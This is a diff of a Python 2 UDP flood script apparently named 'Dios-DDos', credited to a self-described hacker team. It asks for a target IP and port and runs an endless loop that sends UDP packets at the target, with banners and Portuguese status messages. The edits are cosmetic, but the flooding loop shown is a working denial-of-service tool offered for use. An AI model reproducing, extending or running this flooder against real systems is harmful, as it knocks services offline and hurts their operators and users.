@@ -37,7 +37,7 @@ print "\033[92m=  ====  ==  ====  ==  ====  ==  ====  =\033[0m"
 print "\033[92m=  ====  ==  ====  ===  ==  ===  ====  =\033[0m"
 print "\033[92m=       ===       =====    =====      ==\033[0m"
 print "\033[92m========================================\033[0m"
-print "     https://github.com/DiosDeLaWeb/Dios-DDos"
+print "https://github.com/DiosDeLaWeb/Dios-DDos"
 print
 print "codder by: dios de la web   #dono do script"
 print "new team 404                #melhor team hacker"
@@ -51,16 +51,14 @@ ip = raw_input("IP Alvo :")
 port = input("Port       :")
 
 os.system("clear")
+print "[+] Preparando..."
+time.sleep(3)
 print "\033[92m ____  ____   ___  ____     ____  ___\033[0m"
 print "\033[92m|  _ \|  _ \ / _ \/ ___|   / ___|/ _ \|\033[0m"
 print "\033[92m| | | | | | | | | \___ \  | |  _| | | |\033[0m"
 print "\033[92m| |_| | |_| | |_| |___) | | |_| | |_| |\033[0m"
 print "\033[92m|____/|____/ \___/|____/   \____|\___/\033[0m"
-print
-print "[+] \033[92mPREPARANDO...\033[0m"
-time.sleep(5)
-print "[+] \033[92mCOMECANDO ATACK\033[0m "
-time.sleep(5)
+time.sleep(3)
 sent = 0
 while True:
     sock.sendto(bytes, (ip,port))
@@ -69,3 +67,4 @@ while True:
     print "\033[92mSent %s packet to %s throught port:%s\033[0m"%(sent,ip,port)
     if port == 65534:
         port = 1
+#fim
